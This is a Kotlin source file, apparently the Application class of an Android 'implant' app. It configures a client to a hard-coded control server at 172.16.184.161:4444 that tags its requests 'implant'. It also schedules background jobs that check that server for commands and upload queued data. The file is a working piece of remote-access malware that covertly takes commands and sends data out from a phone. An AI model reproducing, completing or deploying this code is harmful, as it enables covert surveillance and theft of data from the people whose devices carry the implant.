package com.cooperthecoder.implant

import android.app.Application
import com.cooperthecoder.implant.jobs.CheckForCommandsJob
import com.cooperthecoder.implant.jobs.UploadQueueJob
import com.cooperthecoder.implant.network.ControlService
import com.evernote.android.job.JobManager
import okhttp3.Interceptor
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory

class App: Application() {

    companion object {
        lateinit var instance: App
    }

    val controlService: ControlService by lazy {
        val client = OkHttpClient()
        client.interceptors().add(Interceptor {
            val original = it.request()
            val request = original.newBuilder()
                    .addHeader("User-Agent", "implant")
                    .build()

            it.proceed(request)

        })
        Retrofit.Builder()
                .addConverterFactory(MoshiConverterFactory.create())
                .baseUrl("http://172.16.184.161:4444/")
                .build()
                .create(ControlService::class.java)
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        JobManager.create(this).addJobCreator {
            when (it) {
                UploadQueueJob.JOB_NAME -> {
                    UploadQueueJob()
                }

                CheckForCommandsJob.JOB_NAME -> {
                    CheckForCommandsJob()
                }

                else -> {
                    null
                }
            }
        }
    }
}

